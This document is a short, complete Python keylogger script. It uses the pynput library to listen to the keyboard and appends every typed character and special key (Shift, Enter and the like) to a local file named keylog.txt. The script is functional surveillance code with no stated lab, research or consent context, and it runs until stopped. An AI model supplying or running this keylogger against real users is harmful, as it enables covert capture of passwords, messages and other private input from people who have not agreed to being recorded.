from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Logs regular keys
            else:
                f.write(f" [{key}] ")  # Logs special keys (Shift, Enter, etc.)
    except Exception as e:
        print(f"Error: {e}")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
